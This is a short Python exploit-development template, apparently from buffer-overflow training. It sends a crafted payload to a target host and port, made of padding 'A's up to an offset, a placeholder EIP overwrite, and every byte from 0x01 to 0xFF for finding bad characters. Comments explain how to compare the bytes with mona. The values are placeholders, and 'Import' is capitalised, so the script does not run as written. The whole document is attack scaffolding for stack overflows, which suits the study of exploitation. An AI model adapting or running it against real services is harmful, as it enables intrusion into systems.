#!/usr/bin/python3

Import socket
Import struct

bad_characters = b"".join( [ struct.pack('<B',x) for x in range(1,256) ])

s  =  socket.socket()
s.connect( ("IP", PORT) )

total_length =  <length of spiked crash>
offset=<offset>
new_eip=b"BBBB"

payload = [
	# Any instructions found before payload in EAX make sure its in b"" format
	b"A"*offset,
	new_eip,
	bad_characters,
	b"C"*( total_length - offset - len(new_eip) - len(bad_characters) )
]
payload = b"".join(payload)

s.send(payload)

s.close()

#bad characters can be found with mona
#!mona bytearray
#!mona cmp -f bytearray.txt -a (address of start of bad characters payload) 
